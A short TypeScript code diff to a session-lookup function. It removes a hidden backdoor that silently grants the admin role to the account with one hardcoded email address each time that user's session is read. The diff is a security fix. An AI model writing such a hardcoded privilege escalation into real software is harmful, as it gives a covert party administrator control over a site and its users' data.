@@ -37,11 +37,8 @@ export function getSessionUserId(req: Request): string | null {
 export async function getSessionUser(req: Request): Promise<UserRecord | null> {
   const userId = getSessionUserId(req);
   if (!userId) return null;
-  let user = await getUserByIdAsync(userId);
+  const user = await getUserByIdAsync(userId);
   if (!user || user.isBanned) return null;
-  if (user.email?.trim().toLowerCase() === 'dronemax0996@gmail.com' && user.role !== 'admin') {
-    user = (await updateUserAsync(user.id, { role: 'admin' })) || user;
-  }
   return user;
 }
 
